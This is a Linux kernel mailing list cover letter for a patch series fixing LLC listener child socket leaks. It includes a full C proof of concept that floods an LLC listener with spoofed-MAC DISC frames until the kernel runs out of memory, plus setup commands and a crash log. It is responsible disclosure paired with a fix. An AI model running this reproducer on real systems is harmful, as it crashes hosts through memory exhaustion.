Received: from mail-pl1-f179.google.com (mail-pl1-f179.google.com [209.85.214.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B19C73644BE
	for <linux-kernel@vger.kernel.org>; Thu, 27 Aug 2026 08:49:52 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787820596; cv=none; b=Zu6BSB+vF4VpAWx6Z/YogqaeMkNta8jyyQ1DG9YX5O+P1LQ73gt7bV68UqhofHZePh5fSYZs0CSm76EohH3vuWlGnnM7chkQm2iYa1iXBZneR9GVKADwDG7FS1Pw+XQQPSbU9d28xD0j0jdmSqU+ygurzPJoMYoXm5BHbq6J8cA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787820596; c=relaxed/simple;
	bh=JJ9oR5uM2n1RBjM4bLrC1VfXrNNr4P8baeM9i8/BGeg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=pfJAlt/Az5S9m7+2MA+69q8PHMsiLw4w6FQsW4L1EhUxtHpAr/WrZSHQag/XJnQYL83Xr40fKUqheg7oYB7GNfqu27UmIY3PFEilH2vggcd8Zp3+N4PTjNAH0xV4shKtKbhArdCa6lELH4zwyWkclVSg7OIWcn3D6GtbMX6wljA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=eO5a1RVx; arc=none smtp.client-ip=209.85.214.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="eO5a1RVx"
Received: by mail-pl1-f179.google.com with SMTP id d9443c01a7336-2cace91f112so21619195ad.0
        for <linux-kernel@vger.kernel.org>; Thu, 27 Aug 2026 01:49:52 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787820590; x=1788425390; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=QiAjc7cG4zJU6X2xKG+R3ku+OsM7dIw791fxSs5KJ5w=;
        b=eO5a1RVx+Bk2PUvNfIrYJrKG3MhNrMPQyOTzAsKeYSK0U9MKPHEbqJvxro7xLDquPQ
         fMYoAWv10avAZq6muOtm/W8TbK9vj4Y5lV3zE9PtVA2eHpxjqv5wGzRljZYehzmPNeCG
         4rVQg1sgRq43yr/fKkto+7Mkl+zVxqlukvxUtShg53joRREHTFGoWjujXGDA2X2WdPsc
         TkS4AnxTLmpjBhOUJGQct6xCnP78Fl8yFQ3TpNDvU0w7HjM/BqoXwg2AsNBspfflw5Mc
         C1s417hAJeIwFuuw/LXZtCwbssHRcn715htCYiyZHetdFwRvFTyfaOp3mdiKRVG9PAKh
         uxwg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787820590; x=1788425390;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=QiAjc7cG4zJU6X2xKG+R3ku+OsM7dIw791fxSs5KJ5w=;
        b=Xijtd8GHbYCD6XdDkz8OZHNmpqQL5oBKVb5OqulXNe0DVzHOMpaGfks4b7iEWncOId
         vHQ2mdEQIyTz4TnuJERXykgMdK0z8X1+MeknowRo/HNakG8BBTvNUaIl6XSuf+1Dk4Pe
         D+cd3PYKozfBy0PTRAxmCdWb5iLxxjkklPux0bymvMiiVWmtOCiN4CMhbYVQyBtgIxOq
         0/ludc+o4hnl3ewb3UB1yMsVevrjglvO+bbojndpVC8nnWuZ5sUMAElj/+9/I97f2OyZ
         iqJAt8PIjkZaq6TSWrOznhvm9UP5gnQXQdrLdXOW5gj1m9UMALMCS35geTDG50bhJwkK
         8fPQ==
X-Forwarded-Encrypted: i=1; AHgh+Rq3jr+Q1S0HXAFE3D7+6F25/zL6T1Znk+rTzmEL85q2Kw/0sHTqgi5TiXQh/Dd4nSPaka7zieh+tIA6fOs=@vger.kernel.org
X-Gm-Message-State: AFuF++lOenS4W4ISLjI+ajPXLbm5VPYe+xzRHDDo2CS/XEN6LrOYfMzh
	E552SmUnCvYcKG9zE60UxPW9SWVHQP87MqipQyX2tP4NFp7f6S5qwKLLEzOdrhba/S3w
X-Gm-Gg: AR+sD10x/ELRHWlmV1boFS7F7z9zsEPD30WbLNmEXbRvSg3p1vzWiqACa/KXF6k7PWk
	Q1tuNMQ1rEc7J0Q+9rEJ9rSX3mWckzqewpc8UHXlgIbnE8aHJGBN6IbQS01h8AY4UNnSjmW18tM
	NxuD0LOuBib9SrJULl5KR38hVJFHYIIzBhgieE2GjI0rx5dTsIgH7ThxWHBLUdipN32neb8XKl0
	+PeQyiXUqe44VZQFJJIUhMBGiyRdUJ0aNVonkpvUCFHq2xBcUfmAnlzWyaQyOP3Ngh/FDpr1wOZ
	Dz1SNH80mUNPiOYFsGKFygwpaCoQvwlzrC+QgUGK5t3uuqBPmuIqoyzPxnIGJ+RA4lgtoMptxgd
	jMW4NWfC9Jvr5hsHlLzG2lZTfbUN10HqsPGe8qw7VKmtgBLFw8XiWh7RSxvX+FGETYTTI4mjgBf
	N374+imtlMmfvszmbwxeSUzWWdfz6rgj6T+LcwLVxv/XrYoCXUzhQU3k6FbTi+VWY31p07HITv5
	ykSoXOrNUc=
X-Received: by 2002:a05:6a20:3ca5:b0:3cc:9618:f51a with SMTP id adf61e73a8af0-3cf786ca774mr23182900637.8.1787820590258;
        Thu, 27 Aug 2026 01:49:50 -0700 (PDT)
Received: from gmail.com ([42.88.197.68])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc1beeb53absm1836637a12.32.2026.08.27.01.49.43
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 27 Aug 2026 01:49:49 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: "David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>
Cc: netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net v6 0/2] llc: fix listener child socket leaks before passive open completes
Date: Thu, 27 Aug 2026 08:49:36 +0000
Message-ID: <cover.1787752861.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/llc/llc_conn.c. The reproducer needs
CAP_NET_RAW and CAP_NET_ADMIN in init_net.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

llc_conn_handler() creates a passive-open child for every frame matched by an
LLC listener. The child is immediately inserted in the SAP tables and takes a
device reference, before the LLC state machine proves that the frame is a real
passive open and before LLC_CONN_PRIM makes it available to accept().

A non-SABME frame never reaches that indication. The old path therefore leaves
a published child behind which accept() cannot return. The same lifecycle gap
also remains for SABME traffic when direct processing, backlog enqueue, or
backlog processing exits before LLC_CONN_PRIM, and when a listener is closed
with queued but unaccepted children.

The fix creates children only for SABME commands. DISC and other commands that
need an ADM-state DM reply are answered directly from the listener using the
packet source address, while other non-SABME traffic is dropped without driving
the listener state machine.

For SABME, the child remains in the SAP tables during passive open so tuple
lookup continues to win over the listener. The patch tracks children through
pending and queued states, routes packets for a pending child through the
listener-side handshake, and removes any child that has not been accepted when
a failure, backlog drop, or listener close occurs. Cleanup is not gated on the
current TCP state, so children are also released if the socket leaves
TCP_LISTEN before close. Process-context child-lock acquisition is serialized
with bottom halves disabled. Final child destruction is deferred to process
context so its timers can be synchronized safely.

The root-cause fact fixed here predates d389424e00f9. Its parent already
creates a listener-side child, publishes it to the SAP tables before
LLC_CONN_PRIM, and has no rollback path if processing exits early. In the local
visible history, the earliest commit where that root-cause fact is already
present is 1da177e4c3f4 ("Linux-2.6.12-rc2"), so Fixes points there.

The reproducer writes panic_on_oom only to turn the final memory exhaustion into
stable crash evidence after the leak is already confirmed. It is not a
prerequisite for the underlying bug or for the required-capability
trigger path itself.

packetdrill was not used here because the trigger depends on combining a PF_LLC
listening socket with raw AF_PACKET injection over a veth pair while rotating
the source MAC address to force distinct passive-open children. The PoC is
centered on that listener-plus-raw-packet resource leak path rather than on a
packetdrill-friendly timing script.

Reproducer:

    gcc -O2 -static -o poc poc.c
    ./poc llc_rx0 llc_tx0 110000

For the validated run we used the privileged init_net setup below so the PoC
could create llc_rx0/llc_tx0 and then send the crafted LLC traffic:

    ip link add llc_rx0 type veth peer name llc_tx0
    ip link set llc_rx0 address 02:11:22:33:44:55
    ip link set llc_tx0 address 02:11:22:33:44:66
    ip link set llc_rx0 up
    ip link set llc_tx0 up
    ./poc llc_rx0 llc_tx0 110000

For deterministic crash evidence only, after confirming the leak with that
required-capability trigger path, we additionally set:

    echo 2 > /proc/sys/vm/panic_on_oom

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define DEFAULT_REPORT_EVERY 10000ULL

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [rx_if] [tx_if] [count]\n"
		"  rx_if: LLC listener interface (default: %s)\n"
		"  tx_if: raw packet sender interface (default: %s)\n"
		"  count: number of DISC frames to send, 0 means forever\n",
		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");

	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd;

	fd = socket(AF_LLC, SOCK_STREAM, 0);
	if (fd < 0)
		die_errno("socket(AF_LLC)");

	get_if_hwaddr(ifname, mac);

	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");

	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int fd;
	int one = 1;
	int ifindex = get_ifindex(ifname);

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		die_errno("socket(AF_PACKET)");

	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

int main(int argc, char **argv)
{
	static unsigned char frame[ETH_ZLEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_ll sll;
	const char *rx_if = DEFAULT_RX_IF;
	const char *tx_if = DEFAULT_TX_IF;
	uint64_t count = 0;
	uint64_t i = 1;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
		usage(argv[0]);
		return 0;
	}
	if (argc > 1)
		rx_if = argv[1];
	if (argc > 2)
		tx_if = argv[2];
	if (argc > 3) {
		char *end = NULL;

		errno = 0;
		count = strtoull(argv[3], &end, 0);
		if (errno || !end || *end != '\0') {
			fprintf(stderr, "invalid count: %s\n", argv[3]);
			return EXIT_FAILURE;
		}
	}
	if (argc > 4) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst_mac, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	fprintf(stderr,
		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
	fprintf(stderr,
		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
		dst_mac[0], dst_mac[1], dst_mac[2],
		dst_mac[3], dst_mac[4], dst_mac[5]);
	fprintf(stderr,
		"sending LLC DISC commands with a unique spoofed source MAC each time\n");

	while (!count || i <= count) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);

		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");

		if (!(i % DEFAULT_REPORT_EVERY))
			fprintf(stderr, "sent=%llu\n",
				(unsigned long long)i);
		i++;
	}

	close(packet_fd);
	close(listener_fd);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[ 1665.704541][T10284] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled

[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3

[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014

[ 1665.706676][T10284] Call Trace:

[ 1665.706943][T10284]  <TASK>

[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:105 (discriminator 2))

[1665.707568][T10284] panic (kernel/panic.c:339 (discriminator 1))

[1665.707918][T10284] ? dump_header (include/linux/rcupdate.h:815 (discriminator 1) mm/oom_kill.c:455 (discriminator 1) mm/oom_kill.c:478 (discriminator 1))

[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:277)
-----END crash log-----

changes in v6:
  - Hold a reference for children queued for accept() and release it when they
    are dequeued, while retaining SAP publication so tuple lookup still finds
    a pending child before the passive open completes.
  - Make direct receive, backlog, accept-queue, and listener-close cleanup
    symmetric, with bottom-half-disabled child locking in process context.
  - Keep the LLC_CONN_OUT_OF_SVC lower-bound check in its separate patch and
    use the ADM state boundary consistently.
  - v5 Link: https://lore.kernel.org/all/20260822082354.3109-1-zihanx@nebusec.ai/
changes in v5:
  - Make listener child cleanup unconditional so queued children are also
    released if the socket leaves TCP_LISTEN before close.
  - Serialize process-context child cleanup and backlog dispatch with bottom
    halves disabled, avoiding child-lock acquisition races with LLC receive
    and timer paths.
  - Drop packets redirected through a pending child after its listener is no
    longer listening, and release children left out of service instead of
    dispatching them.
  - Split the LLC_CONN_OUT_OF_SVC lower-bound check into a separate patch.
  - v4 Link: https://lore.kernel.org/all/20260814185843.4748-1-zihanx@nebusec.ai/
changes in v4:
  - Create a passive-open child only for SABME and generate listener-side DM
    replies directly for non-SABME commands.
  - Use an atomic incoming-child lifecycle and serialize pending-child lookup,
    backlog processing, rollback, and listener close with the child lock.
  - Keep immediate SAP publication for passive-open tuple matching, but release
    unaccepted children on direct and backlog failures and on listener close.
  - Defer final incoming-child cleanup to workqueue context so timer
    synchronization does not run in the receive softirq path.
  - Add an LLC state lower-bound check before state-table dispatch.
  - v3 Link: https://lore.kernel.org/all/20260805175945.10698-1-zihanx@nebusec.ai/
changes in v3:
  - Drop the unused llc_conn_handler() local rc variable reported in review.
  - Rebase the numbered patch and cover onto commit
    ede76849012e45ffb2193ad110b42027eec02c5c.
  - v2 Link: https://lore.kernel.org/all/cover.1785386749.git.zihanx@nebusec.ai/
changes in v2:
  - Rework the fix to preserve the existing passive-open tuple matching
    semantics instead of deferring child publication until LLC_CONN_PRIM.
  - Track listener-created children pending publication to accept(), and roll
    them back on every earlier failure or drop path.
  - Cover the original non-SABME leak and SABME paths which fail before
    LLC_CONN_PRIM, including backlog enqueue and backlog drop failures.
  - Correct Fixes to 1da177e4c3f4 ("Linux-2.6.12-rc2") based on the earliest
    locally visible history carrying the same root-cause fact.
  - Clarify panic_on_oom crash evidence and packetdrill selection.
  - v1 Link: https://lore.kernel.org/all/cover.1784725007.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi

Zihan Xi (2):
  llc: fix listener child socket leaks before passive open completes
  llc: reject out-of-service state before state lookup

 include/net/llc_conn.h |  13 +-
 net/llc/af_llc.c       |  22 +++-
 net/llc/llc_conn.c     | 274 +++++++++++++++++++++++++++++++++++++++--
 3 files changed, 294 insertions(+), 15 deletions(-)

-- 
2.43.0

